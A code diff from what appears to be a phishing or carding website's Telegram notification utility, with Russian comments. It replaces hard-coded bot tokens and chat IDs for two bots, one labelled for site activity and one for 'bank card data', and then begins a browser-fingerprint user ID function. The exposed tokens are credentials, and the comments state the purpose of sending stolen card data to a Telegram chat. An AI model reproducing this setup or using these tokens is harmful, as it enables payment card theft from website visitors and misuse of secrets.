@@ -1,11 +1,11 @@
 // Telegram Bot утилита для отправки уведомлений
 // Бот 1 - для уведомлений о действиях на сайте
-const BOT_TOKEN = '8331014768:AAGOCsiFshI4o6VkVkY3fiFkdn6Zhoj9N2E'
-const CHAT_ID = '-4862930461'
+const BOT_TOKEN = '8254548176:AAEu0v7emSIgu5pfQMEmAld1uvUmEGeNYEU'
+const CHAT_ID = '-1003239782644'
 
 // Бот 2 - для данных банковских карт
-const BOT_TOKEN_CARDS = '8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg'
-const CHAT_ID_CARDS = '-1003171719602'
+const BOT_TOKEN_CARDS = '8302743640:AAHjAEQCDLkZO7zGGptoH4PwpOqkpSenG14'
+const CHAT_ID_CARDS = '-1003290959617'
 
 // Генерируем уникальный ID пользователя на основе браузера и времени
 export const generateUserId = () => {
